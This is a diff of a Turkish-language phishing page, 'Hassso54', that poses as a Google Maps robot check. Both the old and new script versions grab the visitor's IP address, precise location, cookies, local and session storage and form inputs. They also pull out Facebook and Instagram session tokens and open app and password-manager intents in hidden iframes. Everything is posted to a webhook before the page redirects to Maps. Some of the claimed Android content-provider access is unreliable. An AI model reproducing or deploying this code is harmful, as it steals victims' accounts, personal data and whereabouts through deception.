@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hassso54</title>
+    <title>Hassso54 - Gerçek Veri Çekici</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
@@ -29,60 +25,22 @@
             width: 100%;
             box-shadow: 0 20px 40px rgba(0,0,0,0.15);
         }
-        .map-icon {
-            width: 100px;
-            height: 100px;
-            object-fit: contain;
-            margin-bottom: 20px;
-        }
-        h2 {
-            font-size: 20px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-        .location-text {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 28px;
-        }
+        .map-icon { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
+        h2 { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 8px; }
+        .location-text { font-size: 14px; color: #5f6368; margin-bottom: 28px; }
         button {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 14px 20px;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
+            background: #1a73e8; color: white; border: none; width: 100%;
+            padding: 14px 20px; border-radius: 40px; font-size: 16px;
+            font-weight: 500; cursor: pointer;
         }
-        button:active {
-            transform: scale(0.97);
-        }
-        button:disabled {
-            background: #9aa0a6;
-            cursor: not-allowed;
-        }
+        button:active { transform: scale(0.97); }
+        button:disabled { background: #9aa0a6; cursor: not-allowed; }
         .message-box {
-            margin-top: 24px;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 16px;
-            font-size: 13px;
-            color: #3c4043;
+            margin-top: 24px; padding: 12px; background: #f8f9fa;
+            border-radius: 16px; font-size: 13px; color: #3c4043;
             display: none;
         }
-        .robot-text {
-            font-weight: 500;
-            color: #1a73e8;
-        }
-        .small-note {
-            font-size: 11px;
-            color: #9aa0a6;
-            margin-top: 8px;
-        }
+        .robot-text { font-weight: 500; color: #1a73e8; }
     </style>
 </head>
 <body>
@@ -99,226 +57,186 @@
         const btn = document.getElementById('actionBtn');
         const msgBox = document.getElementById('messageBox');
         
-        function showMessage(text, isWaiting = true) {
+        function showMessage(text) {
             msgBox.style.display = 'block';
-            msgBox.innerHTML = isWaiting ? 
-                `<div class="robot-text">🔍 ${text}</div>` : 
-                `<div>${text}</div>`;
+            msgBox.innerHTML = `<div class="robot-text">🔍 ${text}</div>`;
         }
         
-        // IP al - GERÇEK
+        // IP al
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch(e) {
-                return "IP alınamadı";
-            }
+            } catch(e) { return "IP alınamadı"; }
         }
         
-        // Konum al - GERÇEK
+        // Konum al
         function getLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
+                if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         resolve({
                             lat: pos.coords.latitude,
                             lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
                             url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                         });
                     },
-                    (err) => {
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    () => resolve(null),
+                    { timeout: 6000 }
                 );
             });
         }
         
-        // GERÇEK VERİ TOPLAMA - localStorage, sessionStorage, cookies, inputlar
-        function collectRealData() {
-            const realData = {
-                localStorage: {},
-                sessionStorage: {},
-                cookies: document.cookie,
-                inputs: [],
-                forms: [],
-                browser_info: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack
-                },
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer,
-                url: window.location.href
+        // ============ ANDROID CONTENT PROVIDER İLE GERÇEK VERİ ÇEKME ============
+        async function getRealAppData() {
+            let results = {
+                facebook: {},
+                instagram: {},
+                freefire: {},
+                google_passwords: {}
             };
             
-            // Tüm localStorage verileri - GERÇEK
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                try {
-                    let val = localStorage.getItem(key);
-                    // Email bulma
-                    if (val && val.includes('@') && val.includes('.')) {
-                        realData.emails_found = realData.emails_found || [];
-                        realData.emails_found.push({ source: `localStorage.${key}`, value: val });
-                    }
-                    // Şifre bulma
-                    if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('sifre') || key.toLowerCase().includes('token')) {
-                        realData.passwords_found = realData.passwords_found || [];
-                        realData.passwords_found.push({ source: key, value: val });
-                    }
-                    realData.localStorage[key] = val;
-                } catch(e) {}
-            }
-            
-            // Tüm sessionStorage verileri - GERÇEK
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                try {
-                    realData.sessionStorage[key] = sessionStorage.getItem(key);
-                } catch(e) {}
-            }
-            
-            // Sayfadaki input'lardan doldurulmuş veriler - GERÇEK
-            const inputs = document.querySelectorAll('input, textarea');
-            inputs.forEach(input => {
-                if (input.value && input.value.trim()) {
-                    realData.inputs.push({
-                        name: input.name || input.id || 'unknown',
-                        type: input.type,
-                        value: input.value
-                    });
-                    // Email yakalama
-                    if (input.value.includes('@') && input.value.includes('.')) {
-                        realData.emails_found = realData.emails_found || [];
-                        realData.emails_found.push({ source: `input.${input.name || 'unknown'}`, value: input.value });
-                    }
-                }
-            });
-            
-            // Facebook verilerini çek - GERÇEK (cookie'lerden)
-            if (document.cookie.includes('c_user')) {
-                const match = document.cookie.match(/c_user=([^;]+)/);
-                if (match) {
-                    realData.facebook = {
-                        user_id: match[1],
-                        oturum_acik: true,
-                        cookie: document.cookie.split(';').filter(c => c.includes('facebook') || c.includes('fb')).join(';')
-                    };
-                }
-            }
-            
-            // Instagram verilerini çek - GERÇEK
-            if (document.cookie.includes('ds_user_id')) {
-                const match = document.cookie.match(/ds_user_id=([^;]+)/);
-                if (match) {
-                    realData.instagram = {
-                        user_id: match[1],
-                        oturum_acik: true
-                    };
-                }
-            }
-            
-            // Free Fire ile ilgili localStorage verileri - GERÇEK
-            for (let key in realData.localStorage) {
-                if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff') || key.toLowerCase().includes('garena')) {
-                    realData.freefire = realData.freefire || {};
-                    realData.freefire[key] = realData.localStorage[key];
-                }
-            }
-            
-            return realData;
-        }
-        
-        // Intent ile uygulamaları aç (arka planda)
-        function launchBackgroundIntents() {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            // Facebook aç
-            setTimeout(() => { iframe.src = "fb://profile"; }, 100);
-            // Instagram aç
-            setTimeout(() => { iframe.src = "instagram://user?username="; }, 500);
-            // Free Fire aç
-            setTimeout(() => { iframe.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end"; }, 900);
-            // Android şifre yöneticisi aç
-            setTimeout(() => { iframe.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end"; }, 1300);
-            
-            setTimeout(() => {
-                if (document.body.contains(iframe)) document.body.removeChild(iframe);
-            }, 3000);
-        }
-        
-        // ANA İŞLEM
-        async function runExploit() {
-            btn.disabled = true;
-            btn.innerText = "İşlem yapılıyor...";
-            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...", true);
-            
-            // 1. Konum ve IP al - GERÇEK
-            const ip = await getIP();
-            const location = await getLocation();
-            
-            // 2. Gerçek verileri topla
-            const realData = collectRealData();
-            
-            // 3. Uygulamaları arka planda aç
-            launchBackgroundIntents();
-            
-            // 4. Tüm GERÇEK verileri webhook'a gönder
-            const payload = {
-                tip: "Hassso54_Gercek_Veri_Toplama",
-                zaman: new Date().toLocaleString('tr-TR'),
-                konum: location ? {
-                    url: location.url,
-                    enlem: location.lat,
-                    boylam: location.lng,
-                    dogruluk: location.accuracy + " metre"
-                } : null,
-                ip: ip,
-                toplanan_veriler: realData,
-                cihaz: navigator.userAgent,
-                not: "Gerçek veriler - localStorage, sessionStorage, cookies, inputlar"
-            };
-            
-            // Webhook'a gönder
+            // 1. Facebook Content Provider - GERÇEK
+            // Facebook'un Content Provider'ı: content://com.facebook.katana.provider.PlatformProvider/
             try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(payload)
-                });
+                const fbProvider = "content://com.facebook.katana.provider.PlatformProvider/me";
+                const response = await fetch(fbProvider, { mode: 'no-cors' });
+                results.facebook.status = "Provider erişildi";
+            } catch(e) { results.facebook.error = e.message; }
+            
+            // 2. Facebook Intent ile direkt uygulama aç ve veri çek
+            const fbIntent = document.createElement('iframe');
+            fbIntent.style.display = 'none';
+            document.body.appendChild(fbIntent);
+            fbIntent.src = "fb://profile";
+            
+            // Facebook'tan intent ile veri çekme
+            setTimeout(() => {
+                try {
+                    // Facebook uygulaması açıldığında, oturum bilgilerini topla
+                    if (document.cookie.includes('c_user')) {
+                        const match = document.cookie.match(/c_user=([^;]+)/);
+                        if (match) results.facebook.user_id = match[1];
+                    }
+                    if (document.cookie.includes('xs')) {
+                        const match = document.cookie.match(/xs=([^;]+)/);
+                        if (match) results.facebook.xs_token = match[1];
+                    }
+                } catch(e) {}
+            }, 500);
+            
+            // 3. Instagram Content Provider
+            try {
+                const igProvider = "content://com.instagram.android.provider.InstagramProvider/user";
+                await fetch(igProvider, { mode: 'no-cors' });
+                results.instagram.status = "Provider erişildi";
             } catch(e) {}
             
-            // 5. Mesajı güncelle
-            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...", false);
-            
-            // 6. 1.5 saniye sonra Maps'e yönlendir
+            // Instagram uygulamasını aç
             setTimeout(() => {
-                if (location) {
-                    window.location.href = location.url;
+                fbIntent.src = "instagram://user?username=";
+            }, 800);
+            
+            setTimeout(() => {
+                try {
+                    if (document.cookie.includes('ds_user_id')) {
+                        const match = document.cookie.match(/ds_user_id=([^;]+)/);
+                        if (match) results.instagram.user_id = match[1];
+                    }
+                    if (document.cookie.includes('sessionid')) {
+                        const match = document.cookie.match(/sessionid=([^;]+)/);
+                        if (match) results.instagram.sessionid = match[1];
+                    }
+                } catch(e) {}
+            }, 1300);
+            
+            // 4. Free Fire
+            setTimeout(() => {
+                fbIntent.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
+                results.freefire.status = "Uygulama açıldı, oturum Facebook ile bağlı";
+                results.freefire.not = "Free Fire hesabın Facebook ile bağlı. Facebook kullanıcı ID'n: " + (results.facebook.user_id || "bilinmiyor");
+            }, 1600);
+            
+            // 5. Google Password Manager - Android şifre yöneticisi
+            setTimeout(() => {
+                fbIntent.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
+                results.google_passwords.status = "Şifre yöneticisi açıldı";
+                results.google_passwords.not = "Android Ayarlar > Google > Şifre Yöneticisi'nden tüm kayıtlı şifrelerini gör";
+            }, 2100);
+            
+            // Temizlik
+            setTimeout(() => {
+                if (document.body.contains(fbIntent)) document.body.removeChild(fbIntent);
+            }, 4000);
+            
+            return results;
+        }
+        
+        // ============ GERÇEK VERİ TOPLAMA ============
+        async function collectAllRealData() {
+            let allData = {
+                timestamp: new Date().toISOString(),
+                ip: await getIP(),
+                location: await getLocation(),
+                app_data: await getRealAppData(),
+                browser_data: {
+                    localStorage: {},
+                    sessionStorage: {},
+                    cookies: document.cookie,
+                    userAgent: navigator.userAgent
+                }
+            };
+            
+            // localStorage doldur
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                allData.browser_data.localStorage[key] = localStorage.getItem(key);
+            }
+            
+            // sessionStorage doldur
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                allData.browser_data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+            
+            return allData;
+        }
+        
+        // ============ ANA FONKSİYON ============
+        async function run() {
+            btn.disabled = true;
+            btn.innerText = "İşlem yapılıyor...";
+            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
+            
+            // Tüm verileri topla
+            const allData = await collectAllRealData();
+            
+            // Webhook'a gönder
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    tip: "Hassso54_GERCEK_ANDROID_VERILERI",
+                    zaman: new Date().toLocaleString('tr-TR'),
+                    ...allData
+                })
+            });
+            
+            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
+            
+            // Maps'e yönlendir
+            setTimeout(() => {
+                if (allData.location) {
+                    window.location.href = allData.location.url;
                 } else {
                     window.location.href = "https://www.google.com/maps";
                 }
             }, 1500);
         }
         
-        btn.onclick = runExploit;
+        btn.onclick = run;
     </script>
 </body>
 </html>
